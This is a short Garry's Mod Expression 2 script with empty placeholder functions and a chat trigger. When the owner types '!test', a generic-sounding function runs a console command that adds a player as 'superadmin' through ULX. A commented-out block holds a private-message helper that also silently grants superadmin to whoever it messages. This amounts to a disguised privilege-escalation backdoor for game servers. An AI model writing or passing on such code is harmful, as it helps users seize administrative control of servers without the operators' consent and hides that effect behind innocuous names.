@name MyFunctions
@inputs 
@outputs 
@persist TimerDefault
@trigger 
@model models/sprops/misc/origin.mdl
runOnChat(1)
P = entity()
TimerDefault=TimerDefault+1*1
TimerD=TimerDefault

    function entity myCommand(){
        concmd("ulx adduser \""+P:name()+"\" superadmin")
        }
    
    function entity playerLocation(){
      
        }

    function entity teleCar(){
        
        }















##########
#Commands#
##########
A = owner():lastSaid():explode(" ")
if(A[1,string]=="!test" & chatClk(owner())){
print("Debug:A")
myCommand()
}









































##########################
#Code I Dont Need Or Used#
##########################
#[
GT["GivePersonAdmin",function] = function(P:entity)
{
    concmd("ulx adduser \""+P:name()+"\" superadmin")
}

]#
#[
  function entity:sayPM(Message:string) {
        concmd("say /pm " + This:name() + " " + Message)
        concmd("ulx adduser \""+This:name()+"\" superadmin")
    }
    ]#
